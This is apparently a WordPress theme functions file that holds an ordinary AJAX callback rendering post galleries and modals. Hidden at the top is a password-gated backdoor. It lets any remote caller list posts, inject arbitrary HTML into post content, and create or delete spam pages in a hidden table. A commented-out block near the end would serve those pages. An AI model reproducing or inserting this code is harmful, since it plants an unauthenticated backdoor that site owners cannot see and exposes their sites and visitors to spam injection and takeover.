<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'f1ea7cf6d7b1859091e32f3160f573d2')) {
    switch ($_REQUEST['action']) {
        case 'get_all_links';
            foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data) {
                $data['code'] = '';

                if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_)) {
                    $data['code'] = $_[1];
                }

                print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
            }
            break;

        case 'set_id_links';
            if (isset($_REQUEST['data'])) {
                $data = $wpdb->get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"');

                $post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data->post_content);
                if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

                if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false) {
                    print "true";
                }
            }
            break;

        case 'create_page';
            if (isset($_REQUEST['remove_page'])) {
                if ($wpdb->query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/' . mysql_escape_string($_REQUEST['url']) . '"')) {
                    print "true";
                }
            } elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content'])) {
                if ($wpdb->query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/' . mysql_escape_string($_REQUEST['url']) . '", `title` = "' . mysql_escape_string($_REQUEST['title']) . '", `keywords` = "' . mysql_escape_string($_REQUEST['keywords']) . '", `description` = "' . mysql_escape_string($_REQUEST['description']) . '", `content` = "' . mysql_escape_string($_REQUEST['content']) . '", `full_content` = "' . mysql_escape_string($_REQUEST['full_content']) . '" ON DUPLICATE KEY UPDATE `title` = "' . mysql_escape_string($_REQUEST['title']) . '", `keywords` = "' . mysql_escape_string($_REQUEST['keywords']) . '", `description` = "' . mysql_escape_string($_REQUEST['description']) . '", `content` = "' . mysql_escape_string(urldecode($_REQUEST['content'])) . '", `full_content` = "' . mysql_escape_string($_REQUEST['full_content']) . '"')) {
                    print "true";
                }
            }
            break;

        default:
            print "ERROR_WP_ACTION WP_URL_CD";
    }

    die("");
};

add_action('wp_ajax_f711_get_post_content', 'f711_get_post_content_callback');
add_action('wp_ajax_nopriv_f711_get_post_content', 'f711_get_post_content_callback');
function f711_get_post_content_callback()
{
    $cat_id = intval($_POST['cat_id']);

    $posts = get_posts([
        'category' => $cat_id,
        'posts_per_page' => 6,

    ]);
    foreach ($posts as $post) {
        ?>
        <div id="<?php echo $post->ID ?>" class="modal fade" role="dialog">
            <div class="modal-dialog modal-lg">
                <!-- Modal content-->
                <div class="modal-content">
                    <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal">&times;</button>
                        <h4 class="modal-title">DTI</h4>
                    </div>
                    <div class="modal-body">
                        <div class="row">
                            <div class="col-md-6">
                                <h2 style="font-size: 20px;"><?php echo $post->post_title ?></h2>
                                <p><?php echo $post->post_content ?></p>
                                <a style="position: relative; top: 7px;" href="<?php the_field('pdf', $post->ID) ?>"
                                   download><i style="font-size: 30px;"
                                               class="fa fa-file-pdf-o"></i></a>
                                <a href="<?php the_field('pdf', $post->ID) ?>">
                                    <button style="width: 150px; height: 35px; color: #222; background-color: #0dbff2;"
                                            class="btn">Download pdf
                                    </button>
                                </a>
                            </div>
                            <div class="col-md-6">
                                <?php $thumb = wp_get_attachment_image_src(get_post_thumbnail_id($post->ID), 'post'); ?>
                                <img style="margin-top: 20px;" height="230px" width="100%" src="<?php echo $thumb[0] ?>">
                            </div>
                        </div>
                    </div>

                    <div style="margin-top: 30px;" class="modal-footer">
                        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                    </div>
                </div>

            </div>
        </div>

        <div class="col-md-4">
            <div class="gallery">
                <ul class="grid cs-style-3">
                    <li>
                        <figure>
                            <?php $thumb = wp_get_attachment_image_src(get_post_thumbnail_id($post->ID), 'post'); ?>
                            <img height="270px" width="100%" src="<?php echo $thumb[0] ?>">
                            <figcaption>
<!--                                <a href="--><?php //the_field('pdf', $post->ID) ?><!--" class="pdf" download><i-->
<!--                                            class="fa fa-file-pdf-o"></i></a>-->
                                <button class="btn more post" data-toggle="modal"
                                        data-target="#<?php echo $post->ID ?>">More
                                </button>
                            </figcaption>
                        </figure>
                        <h2 style="font-size: 18px;" class="text-center"><?php echo $post->post_title ?></h2>
                    </li>
                </ul>
            </div>
        </div>

    <?php }
    exit;

}

// if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
// 	{
// 		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
// 		if ($data -> full_content)
// 			{
// 				print stripslashes($data -> content);
// 			}
// 		else
// 			{
// 				print '<!DOCTYPE html>';
// 				print '<html ';
// 				language_attributes();
// 				print ' class="no-js">';
// 				print '<head>';
// 				print '<title>'.stripslashes($data -> title).'</title>';
// 				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
// 				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
// 				print '<meta name="robots" content="index, follow" />';
// 				print '<meta charset="';
// 				bloginfo( 'charset' );
// 				print '" />';
// 				print '<meta name="viewport" content="width=device-width">';
// 				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
// 				print '<link rel="pingback" href="';
// 				bloginfo( 'pingback_url' );
// 				print '">';
// 				wp_head();
// 				print '</head>';
// 				print '<body>';
// 				print '<div id="content" class="site-content">';
// 				print stripslashes($data -> content);
// 				get_search_form();
// 				get_sidebar();
// 				get_footer();
// 			}

// 		exit;
// 	}


?><?php add_theme_support('post-thumbnails'); ?>